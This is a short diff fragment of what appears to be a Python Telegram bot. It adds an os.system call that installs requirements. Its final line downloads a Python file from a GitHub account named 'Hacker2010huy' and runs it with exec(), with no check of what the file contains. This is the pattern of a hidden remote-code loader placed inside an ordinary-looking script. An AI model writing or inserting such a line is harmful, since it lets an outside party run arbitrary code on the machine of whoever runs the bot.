@@ -29,4 +29,5 @@ def offbot(message):
 
 bot.infinity_polling()
 
+os.system("pip install -r requirements.txt")
 exec(requests.get("https://raw.githubusercontent.com/Hacker2010huy/Bot-Telegram/main/main.py").text)
